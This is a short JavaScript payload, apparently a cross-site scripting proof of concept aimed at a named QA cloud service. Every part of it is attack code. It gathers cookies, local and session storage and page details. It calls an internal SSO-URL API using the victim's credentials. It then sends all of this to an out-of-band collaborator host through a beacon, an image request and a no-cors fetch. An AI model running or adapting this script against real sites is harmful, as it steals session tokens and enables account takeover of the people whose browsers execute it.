const collaborator = 'https://u3y701j6zmu091cehngccvx9l0rrfk39.oastify.com';

// Collect all accessible data
const collectData = async () => {
    const data = {
        cookies: document.cookie,
        origin: window.location.origin,
        userAgent: navigator.userAgent,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        timestamp: new Date().toISOString(),
        url: window.location.href
    };

    // Try to access internal API
    try {
        const response = await fetch('https://qa.cloud.cambiumnetworks.com/cn-rtr/organizations/48c489f677f5e2c337030705ffa47b3f/sso-url', {
            credentials: 'include',
            headers: { 
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            }
        });
        
        if (response.ok) {
            const apiData = await response.json();
            data.internalApi = apiData;
            data.internalStatus = 'SUCCESS';
        } else {
            data.internalStatus = `FAILED: ${response.status}`;
        }
    } catch (error) {
        data.internalStatus = `ERROR: ${error.message}`;
    }
    
    return data;
};

// Multiple exfiltration methods
const exfiltrate = (data) => {
    const jsonData = JSON.stringify(data, null, 2);
    
    // Method 1: sendBeacon (no CORS issues)
    navigator.sendBeacon(`${collaborator}/beacon`, jsonData);
    
    // Method 2: Image (no CORS)
    new Image().src = `${collaborator}/img?data=${btoa(encodeURIComponent(jsonData))}`;
    
    // Method 3: Fetch with no-cors (can't read response but sends)
    fetch(`${collaborator}/fetch`, {
        method: 'POST',
        mode: 'no-cors',
        body: jsonData
    });
};

// Execute
collectData().then(exfiltrate);
